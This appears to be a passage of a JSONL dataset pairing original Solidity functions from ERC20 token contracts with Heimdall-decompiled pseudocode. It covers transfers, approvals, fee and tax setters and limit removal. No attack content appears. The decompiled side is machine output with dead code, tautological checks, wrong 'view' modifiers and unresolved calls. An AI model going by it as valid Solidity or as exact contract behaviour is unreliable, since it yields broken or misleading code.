address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).{ value: 0 ether }Unresolved_a9059cbb(var_d); // call\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (var_f));\n    }"}
{"contract_address": "0x00E0e40FCbd04bbbF62056e268907E8318b84d67", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaCb8531Fb60d23846f82b8911F28b44D83e2554d", "original_solidity_code": "function setfinalselltax(uint256 finalselltax) external onlyOwner() {\r\n        _finalSellTax = finalselltax;\r\n        require(_finalSellTax<=30, \"less than 30%\");\r\n    }", "heimdall_decompiled_code": "function setfinalselltax(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _finalSellTax = arg0;\n        require(!(arg0 > 0x1e), \"less than 30%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0d;\n        var_d = 0x6c657373207468616e2033302500000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x605dB46AD9766ADC36De8974ae0b58827878C232", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(!(store_b > store_c), \"SafeMath: multiplication overflow\");\n        require(!(!store_b > store_d), \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x04;\n        require(storage_map_i[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x04;\n        storage_map_i[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_i[var_a] > (storage_map_i[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_i[var_a] + ((arg1 * store_e) / 0x64) < storage_map_i[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_i[var_a] = storage_map_i[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_j = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_i[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_i[var_a] - arg1) > storage_map_i[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_i[var_a] = storage_map_i[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_i[var_a] > _maxTaxSwap) {\n            }\n            if (!storage_map_i[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_c) {\n                if (!store_b > store_l) {\n                    if (store_b > store_d) {\n                        if (arg1 - 0) {\n                            if (!arg1 | (store_e == ((arg1 * store_e) / arg1))) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_b = 0x11;\n                                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n                            }\n                        }\n                        require(store_b > store_c, \"Exceeds the _maxTxAmount.\");\n                    }\n                }\n                require(!(!store_b > store_d), \"Exceeds the _maxTxAmount.\");\n            }\n            require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        if (!store_b > store_c) {\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function updateSwapTokensAtAmount(uint256 newAmount)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            newAmount >= (totalSupply() * 1) / 100000,\r\n            \"Swap amount cannot be lower than 0.001% total supply.\"\r\n        );\r\n        require(\r\n            newAmount <= (totalSupply() * 5) / 1000,\r\n            \"Swap amount cannot be higher than 0.5% total supply.\"\r\n        );\r\n        swapTokensAtAmount = newAmount;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function updateSwapTokensAtAmount(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(totalSupply & (0x01 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / totalSupply))), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x35;\n        var_e = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_h = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0x8a357F1146a32d8a2494bCdaB62452ed3498196a", "original_solidity_code": "function manualSwap() external {\n        require(_msgSender()==_taxWallet);\n        uint256 tokenBalance=balanceOf(address(this));\n        if(tokenBalance>0){\n          swapTokensForEth(tokenBalance);\n        }\n        uint256 ethBalance=address(this).balance;\n        if(ethBalance>0){\n          sendETHToFee(ethBalance);\n        }\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_p)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_f = 0x01000000000000000000000000000000000000000000 | (uint248(store_f));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!((var_d + ret0.length) - var_d) < 0x20);\n        require(var_d.length == (address(var_d.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this));\n        require(address(store_l));\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_o = var_d.length;\n        address var_p = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l).code.length);\n        (bool success, bytes memory ret0) = address(store_l).Unresolved_791ac947(var_l); // call\n        store_f = uint248(store_f);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_p).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_p = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_p = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x20C7b73Be0B1AD179Db94e5b0AC9aD86fa0f068c", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x05f5e100 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (!0x05f5e100 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x05f5e100 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function updateSellFees(\r\n        uint256 _marketingFee,\r\n        uint256 _developmentFee,\r\n        uint256 _liquidityFee\r\n    ) external onlyOwner {\r\n        sellMarketingFee = _marketingFee;\r\n        sellDevelopmentFee = _developmentFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellTotalFees =\r\n            sellMarketingFee +\r\n            sellDevelopmentFee +\r\n            sellLiquidityFee;\r\n        previousFee = sellTotalFees;\r\n        require(sellTotalFees <= 10, \"ERC20: Must keep fees at 10% or less\");\r\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_k = arg0;\n        store_l = arg1;\n        store_m = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xa5060B53791533b0dE5C831e925668A09eBCCd77", "original_solidity_code": "function updateBuyFees(\r\n        uint256 _developmentFee,\r\n        uint256 _marketingFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _devFee\r\n    ) external onlyOwner {\r\n        require((_developmentFee + _marketingFee + _liquidityFee ) <= 10, \"Max BuyFee 10%\");\r\n        buyDevelopmentFee = _developmentFee;\r\n        buyMarketingFee = _marketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyDevFee = _devFee;\r\n        buyTotalFees = buyDevelopmentFee + buyMarketingFee + buyLiquidityFee + buyDevFee;\r\n     }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!arg0 > ~(arg1));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        _transferOwnership(address(0));\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xe5D4968bE9C41A41eB6b6eE324484A1e44Ce0FE2", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x66;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaCb8531Fb60d23846f82b8911F28b44D83e2554d", "original_solidity_code": "function setTaxWallet(address payable taxWallet) external onlyOwner() {\r\n        _taxWallet = taxWallet;\r\n    }", "heimdall_decompiled_code": "function setTaxWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_f = (address(arg0)) | (uint96(store_f));\n    }"}
{"contract_address": "0xd4877eAc39dC23770c50dAbcB1F2BC6208893E92", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(!arg1 < arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!0x64 > (~(arg1 - arg1)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_c = 0x194a51d800000000000000000000000000000000000000000000000000000000;\n        address var_d = address(msg.sender);\n        address var_e = address(arg0);\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).{ value: 0 ether }Unresolved_194a51d8(var_d); // call\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!((var_f + ret0.length) - var_f) < 0x20);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa5060B53791533b0dE5C831e925668A09eBCCd77", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\\n        require(newNum >= ((totalSupply() * 5) / 1000) / 1e18, \\\"Cannot set maxWallet lower than 0.5%\\\");\\n        maxWallet = newNum * (10 ** 18);\\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x05) / 0x05)) | !0x05);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
